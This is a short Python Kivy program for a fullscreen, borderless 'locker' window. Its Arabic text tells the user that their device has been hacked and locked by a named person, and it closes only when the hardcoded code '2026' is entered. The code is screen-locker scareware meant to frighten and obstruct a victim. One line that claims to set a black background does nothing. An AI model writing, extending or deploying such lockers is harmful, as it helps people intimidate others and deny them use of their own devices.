from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window

# الرمز الخاص بك للفتح
MY_KEY = "2026"

class LockerApp(App):
    def build(self):
        # جعل التطبيق يملأ الشاشة بالكامل
        Window.borderless = True
        Window.fullscreen = 'auto'
        
        self.layout = BoxLayout(orientation='vertical', padding=50, spacing=20)
        self.layout.canvas.before.add # (هنا نضع خلفية سوداء)
        
        self.msg = Label(text="تم اختراق وقفل جهازك من قبل حيدر\nأدخل الرمز للفتح", 
                         font_size='25sp', color=(1, 0, 0, 1))
        
        self.input = TextInput(hint_text="Code...", password=True, multiline=False)
        self.btn = Button(text="Unlock", background_color=(0, 1, 0, 1))
        self.btn.bind(on_press=self.check_code)
        
        self.layout.add_widget(self.msg)
        self.layout.add_widget(self.input)
        self.layout.add_widget(self.btn)
        
        return self.layout

    def check_code(self, instance):
        if self.input.text == MY_KEY:
            App.get_running_app().stop()

if __name__ == "__main__":
    LockerApp().run()

